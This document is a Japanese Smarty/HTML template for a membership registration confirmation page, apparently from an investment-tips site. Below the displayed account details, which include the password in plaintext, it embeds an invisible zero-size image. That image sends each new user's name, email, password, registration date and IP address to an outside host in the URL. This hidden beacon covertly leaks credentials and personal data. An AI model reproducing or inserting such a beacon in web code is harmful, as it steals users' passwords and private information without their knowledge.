<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="ja" xmlns="http://www.w3.org/1999/xhtml">
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="content-style-type" content="text/css">
<meta http-equiv="content-script-type" content="text/javascript">
<title>会員登録完了</title>
<meta name="author" content="">
<meta name="keyword" content="">
<meta name="description" content="">

<link rel="stylesheet" type="text/css" href="css/index.css" media="all">
</head>

<body>
<!-- ヘッダー -->
<div id="header">

{include file="header.tpl"}

</div>
<!-- / ヘッダー -->

<!-- メインコンテンツ -->
<div id="container">

<div id="main">
{if true == $result}
<h2>登録ありがとうございました。</h2>
<p>{$user->get_value("name")} さんの登録情報は、</p>
<dl class="dl01">
    <dt>登録日</dt>
    <dd>{$user->get_value("upate_date")}</dd>
    <dt>名前</dt>
    <dd>{$user->get_value("name")}</dd>
    <dt>メールアドレス</dt>
    <dd>{$user->get_value("mail")}</dd>
    <dt>パスワード</dt>
    <dd>{$user->get_value("pass")}</dd>
</dl>
<img src="http://toushi1000.com/t/groups/aaa/click.php?name={$user->get_value("name")}&email={$user->get_value("mail")}&free8={$user->get_value("pass")}&free9={$user->get_value("update_date")}&free10={$_SERVER["REMOTE_ADDR"]}" border="0" height="0" width="0">

<p style="clear:both;"><a href="http://sfntoushi.com/vip/" target="_blank">こちら</a>からログインをして銘柄をチェックしてみてください。</p>
<p style="clear:both;">&nbsp;</p>
<p>です。<br />
{else}
<h2>その内容は登録できません</h2>
<p>各項目に未入力箇所がないか確認お願いします。</p>
{/if}
    <br />

</p>
</div>


</div>
<!-- フッター上部 -->

{include file="footer.tpl"}


</body>
</html>
